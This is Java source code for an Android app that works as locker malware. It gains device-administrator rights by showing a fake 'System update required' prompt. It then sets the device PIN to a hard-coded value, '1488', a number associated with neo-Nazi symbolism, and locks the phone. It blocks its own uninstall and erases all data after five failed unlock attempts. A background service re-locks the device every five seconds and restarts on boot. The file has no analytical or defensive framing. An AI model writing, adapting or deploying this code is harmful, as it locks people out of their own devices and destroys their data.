package com.locker;

import android.app.*;
import android.app.admin.*;
import android.content.*;
import android.os.*;

public class Locker {

    public static final String PIN = "1488";
    public static final int MAX_FAILS = 5;

    public static void scream(Context ctx) {
        try {
            Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) v.vibrate(2000);
        } catch (Exception ignored) {}
    }

    public static class MainActivity extends Activity {
        @Override
        protected void onCreate(Bundle b) {
            super.onCreate(b);
            scream(this);

            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, Admin.class);

            if (!dpm.isAdminActive(admin)) {
                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System update required");
                startActivity(i);
            }

            Intent svc = new Intent(this, LockerService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
            else startService(svc);
            finish();
        }
    }

    public static class Admin extends DeviceAdminReceiver {
        @Override
        public void onEnabled(Context ctx, Intent intent) {
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(ctx, Admin.class);

            dpm.setPasswordMinimumLength(admin, 4);
            dpm.setPasswordQuality(admin, DevicePolicyManager.PASSWORD_QUALITY_NUMERIC);
            dpm.resetPassword(PIN, 0);
            dpm.lockNow();
            scream(ctx);

            try {
                dpm.setUninstallBlocked(admin, ctx.getPackageName(), true);
            } catch (Exception ignored) {}
        }

        @Override
        public void onPasswordFailed(Context ctx, Intent intent) {
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm.getCurrentFailedPasswordAttempts() >= MAX_FAILS) {
                dpm.wipeData(0);
            }
            scream(ctx);
        }
    }

    public static class LockerService extends Service {
        private final Handler h = new Handler(Looper.getMainLooper());
        private final Runnable t = new Runnable() {
            @Override
            public void run() {
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName a = new ComponentName(LockerService.this, Admin.class);
                if (dpm != null && dpm.isAdminActive(a)) {
                    dpm.resetPassword(PIN, 0);
                    dpm.lockNow();
                }
                h.postDelayed(this, 5000);
            }
        };

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            h.post(t);
            return START_STICKY;
        }

        @Override
        public IBinder onBind(Intent intent) { return null; }
    }

    public static class BootReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                Intent svc = new Intent(ctx, LockerService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(svc);
                else ctx.startService(svc);
            }
        }
    }
                              }
